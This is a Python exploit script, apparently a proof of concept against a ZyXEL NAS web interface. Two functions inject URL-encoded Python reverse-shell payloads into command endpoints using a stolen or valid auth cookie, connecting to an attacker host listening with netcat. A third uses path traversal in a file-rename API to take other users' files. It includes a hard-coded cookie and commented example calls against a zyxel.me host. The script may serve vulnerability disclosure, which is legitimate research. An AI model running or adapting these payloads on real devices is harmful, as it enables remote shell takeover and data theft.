import requests 

'''
By Maxwell Dulin aka Strikeout
http://maxwelldulin.com
To use, insert a valid cookie into the 'cookie' variable. 
From there, choose an exploit to do by adding the right values to it. 
The first two functions need a location and a valid token, as well as a IP to connect to and a port. The third function needs a file to move. 
'''


'''
Args: 
	token: the auth token needed for the request 
	location: The domain name for the URL to call.
	backdoor_ip: The backdoor's location 
	port: The port of the backdoor server being used. 
'''
def python_routing(location, token, backdoor_ip, port):
	# Given that backdoor_ip is listening on the port variable with netcat, this backdoors works, with a valid cookie. To replicate this, use the payload below with a netcat listener on backdoor_ip on port. 
	# To setup the listener, use nc -lvp 'port' on your server.

	URL = "/cmd,/tjp6jp6y4/BackupPlanner_main/os.system(" + encode_characters("\"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"\\x2Fbin\\x2Fsh\",\"-i\"]);' &\"\"\"".format(backdoor_ip, str(port))) + ')'

	cookies = {'authtok': cookie}
	r = requests.get(url=location+URL, cookies = cookies)
	print "Backdoor created..." 

'''
Args: 
	token: the auth token needed for the request 
	location: The domain name for the URL to call.
	backdoor_ip: The backdoor's location 
	port: The port of the server being used. 
'''
def package_manager(location, token, backdoor_ip, port):
	# Given that backdoor_ip is listening on the port variable with netcat, this backdoors works, with a valid cookie. To replicate this, use the payload below with a netcat listener on backdoor_ip on port. 
	# To setup the listener, use nc -lvp 'port' on your server.


	URL= "/cmd,/tjp6jp6y4/portal_main/pkg_init_cmd?pkgname=myZyXELcloud-Agent&cmd=" + encode_characters("""`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\x2Fbin\x2Fsh","-i"]);'` &""".format(backdoor_ip,port)) 
	
	cookies = {'authtok': cookie}
	r = requests.get(url=location+URL, cookies = cookies)
	print "Backdoor created..."
	
def file_mover(service, cookie, share, user, file_final_location, file_to_move): 
	"""
	Parameters: 
	cookie: The auth token 
	share: The current location of the user. Just needs to be something that the current user can see. 
	user: The current user 
	file_final_location: In correspondance to the current share, where should the file go. 
	file_to_move: The file to move. The file to traverse to find within any share (private or public) 
	
	The trick is that the API does not validate input from the user, allowing for users to steal files from other users. The issue is with file_to_move not validating the path. 
	"""
	URL = "/cmd,/ck6fup6/fileBrowser_main/non_job_queue_operation"

	json = {'share' : share, 'view':'tree', 'whoami':user, 'action':'rename', 'target_path': file_final_location, 'username': user, 'path': file_to_move}
	cookies = {'authtok': cookie}
	r = requests.post(url=service+URL, cookies = cookies, data=json)	
	print("Check the file share now...")

# Completely URL encodes the string 
def encode_characters(string): 
	encoded_string = '' 
	for char in string: 
		encoded_string += '%' + hex(ord(char))[2:]
	return encoded_string
	
def decode(chr):
	return chr.decode('hex')

# Sub this cookie for a valid one. 
cookie = "QfmcCg89pVv-JI-KwAz+xIi2JYa98c21zPLWsN+zuwhqcurjwo2cOgnE5mT48HqQ"

# The different exploits... Use one at a time. 
#python_routing("http://maxwell-5.zyxel.me:8000/", cookie, "maxwelldulin.com","4444")
#package_manager("http://maxwell-5.zyxel.me:8000/", cookie, "maxwelldulin.com","4444")
#file_mover("http://maxwell-5.zyxel.me:8000/", cookie, "photo","test","Nonce.txt","/../admin/Nonce.txt",)
